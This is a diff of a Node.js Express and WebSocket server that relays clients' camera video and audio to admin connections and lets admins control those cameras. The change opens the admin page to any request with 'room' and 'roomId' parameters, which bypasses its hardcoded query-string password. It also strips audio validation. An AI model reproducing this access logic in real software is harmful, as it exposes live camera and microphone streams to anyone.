@@ -21,13 +21,56 @@ const storage = multer.diskStorage({
 });
 const upload = multer({ storage: storage });
 
+// Disable caching for all files
+app.use((req, res, next) => {
+  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
+  res.setHeader('Pragma', 'no-cache');
+  res.setHeader('Expires', '0');
+  next();
+});
+
 app.use(express.static(path.join(__dirname)));
 app.use('/uploads', express.static('uploads'));
 
-app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));
+app.get('/', (req, res) => {
+  try {
+    res.sendFile(path.join(__dirname, 'index.html'));
+  } catch (error) {
+    console.error('Error serving index.html:', error);
+    res.status(500).send('Errore interno del server');
+  }
+});
+
 app.get('/admin', (req, res) => {
-  if(req.query.pass !== 'secret123') return res.status(403).send('Accesso negato');
-  res.sendFile(path.join(__dirname, 'admin.html'));
+  // Allow access if password is correct OR if room parameters are provided
+  const hasPassword = req.query.pass === 'secret123';
+  const hasRoomParams = req.query.room && req.query.roomId;
+  
+  if (!hasPassword && !hasRoomParams) {
+    return res.status(403).send('Accesso negato');
+  }
+  
+  try {
+    res.sendFile(path.join(__dirname, 'admin.html'));
+  } catch (error) {
+    console.error('Error serving admin.html:', error);
+    res.status(500).send('Errore interno del server');
+  }
+});
+
+// Redirect any requests to index.html to admin.html
+app.get('/index.html', (req, res) => {
+  res.redirect('/');
+});
+
+// Disable service worker
+app.get('/sw.js', (req, res) => {
+  res.status(404).send('Service Worker not found');
+});
+
+// Disable manifest
+app.get('/manifest.json', (req, res) => {
+  res.status(404).send('Manifest not found');
 });
 
 // File upload endpoint
@@ -343,41 +386,36 @@ wss.on('connection', (ws, req)=>{
 
       // Video with improved streaming
       if(data.type==='video'){
+        console.log(`🎥 Video received from client ${room}: ${data.image ? data.image.length : 0} bytes`);
         admins.forEach(a=>{
-          if(a.readyState===ws.OPEN) a.send(JSON.stringify({ 
-            type:'video', 
-            room:room, 
-            cam:data.cam, 
-            image:data.image,
-            timestamp: Date.now()
-          }));
+          if(a.readyState===ws.OPEN) {
+            a.send(JSON.stringify({ 
+              type:'video', 
+              room:room, 
+              cam:data.cam, 
+              image:data.image,
+              timestamp: Date.now()
+            }));
+            console.log(`🎥 Video forwarded to admin`);
+          }
         });
       }
 
-      // Audio streaming with quality checks
+      // Audio streaming
       if(data.type==='audio'){
-        // Validate audio data
-        if(data.audio && data.sampleRate && data.audio.length > 0) {
-          console.log(`🎵 Audio received from client ${room}: ${data.audio.length} bytes, sampleRate: ${data.sampleRate}`);
-          admins.forEach(a=>{
-            if(a.readyState===ws.OPEN) {
-              try {
-                a.send(JSON.stringify({ 
-                  type:'audio', 
-                  room:room, 
-                  audio:data.audio,
-                  sampleRate: data.sampleRate,
-                  timestamp: Date.now()
-                }));
-                console.log(`🎵 Audio forwarded to admin`);
-              } catch (err) {
-                console.error('Error sending audio to admin:', err);
-              }
-            }
-          });
-        } else {
-          console.warn('Invalid audio data received from client:', data);
-        }
+        console.log(`🎵 Audio received from client ${room}: ${data.audio ? data.audio.length : 0} bytes`);
+        admins.forEach(a=>{
+          if(a.readyState===ws.OPEN) {
+            a.send(JSON.stringify({ 
+              type:'audio', 
+              room:room, 
+              audio:data.audio,
+              sampleRate: data.sampleRate,
+              timestamp: Date.now()
+            }));
+            console.log(`🎵 Audio forwarded to admin`);
+          }
+        });
       }
 
       // Camera control from admin
@@ -399,8 +437,6 @@ wss.on('connection', (ws, req)=>{
             } else {
               console.log(`❌ Client in room ${targetRoom} is not open`);
             }
-          } else {
-            console.log(`❌ Room ${targetRoom} not found in clients`);
           }
         }
       }
